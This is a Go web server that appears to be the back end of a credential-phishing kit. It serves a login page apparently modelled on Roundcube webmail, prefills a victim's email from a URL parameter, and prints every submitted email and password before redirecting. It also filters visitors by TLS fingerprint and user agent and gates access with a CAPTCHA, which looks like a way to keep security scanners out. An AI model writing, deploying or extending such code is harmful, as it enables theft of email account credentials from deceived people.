package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"

	"github.com/joho/godotenv"
	"github.com/lulexhostt/authapp/middlewares"
	"gopkg.in/yaml.v2"
)

// BotGuardConfig defines the structure for the YAML configuration.
type BotGuardConfig struct {
	MinVer string `yaml:"min_ver"`
	Ja4    struct {
		Allow []struct {
			B string `yaml:"b"`
		} `yaml:"allow"`
		Deny []struct {
			B string `yaml:"b"`
		} `yaml:"deny"`
	} `yaml:"ja4"`
	UserAgent struct {
		Allow []struct {
			Browser string `yaml:"browser"`
			Version string `yaml:"version"`
		} `yaml:"allow"`
		Deny []struct {
			Browser string `yaml:"browser"`
		} `yaml:"deny"`
	} `yaml:"user_agent"`
}

// loadConfig loads the BotGuard YAML configuration file.
func loadConfig() (*BotGuardConfig, error) {
	configPath, err := filepath.Abs("config/botguard.yaml")
	if err != nil {
		return nil, err
	}
	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}
	var config BotGuardConfig
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}
	return &config, nil
}

// setCSP sets the Content Security Policy header for security.
func setCSP(w http.ResponseWriter) {
	w.Header().Set("Content-Security-Policy", "default-src 'self' https://logo.clearbit.com; img-src 'self' https://image.thum.io https://roundcube.secure.ne.jp https://i.imgur.com https://logo.clearbit.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ajax.googleapis.com https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://logo.clearbit.com https://image.thum.io https://baloncard.online; frame-src https://challenges.cloudflare.com;")
}

// challengeHandler serves the Turnstile CAPTCHA challenge page.
func challengeHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	// Load and render the challenge.html template
	tmpl, err := template.ParseFiles("templates/challenge.html")
	if err != nil {
		http.Error(w, "Unable to load challenge template", http.StatusInternalServerError)
		return
	}

	// Pass the sync email to the challenge template for UI usage
	email := r.URL.Query().Get("sync")
	tmpl.Execute(w, map[string]interface{}{"Email": email})
}

// authHandler handles the login form submission.
func authHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	if r.Method == http.MethodPost {
		r.ParseForm()
		email := r.FormValue("rcmloginuser")
		password := r.FormValue("rcmloginpwd")
		fmt.Printf("Email: %s, Password: %s\n", email, password)
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	// Render the auth.html form template for GET requests
	tmpl, err := template.ParseFiles("templates/auth.html")
	if err != nil {
		http.Error(w, "Unable to load auth template", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

func main() {
	// Load environment variables from .env file
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error loading .env file: %v", err)
	}

	// Load the BotGuard configuration
	config, err := loadConfig()
	if err != nil {
		log.Fatalf("Error loading config: %v", err)
	}
	fmt.Printf("Loaded BotGuard config: %+v\n", config)

	// Set up routes and middlewares
	mux := http.NewServeMux()

	// Serve static assets
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// Handle authentication with Turnstile validation middleware
	mux.Handle("/auth", middlewares.TurnstilePreloadMiddleware(http.HandlerFunc(authHandler)))

	// Handle the challenge route
	mux.HandleFunc("/challenge", challengeHandler)

	// Start the server on port 8080
	fmt.Println("Server is running on port 8080...")
	log.Fatal(http.ListenAndServe(":8080", mux))
}
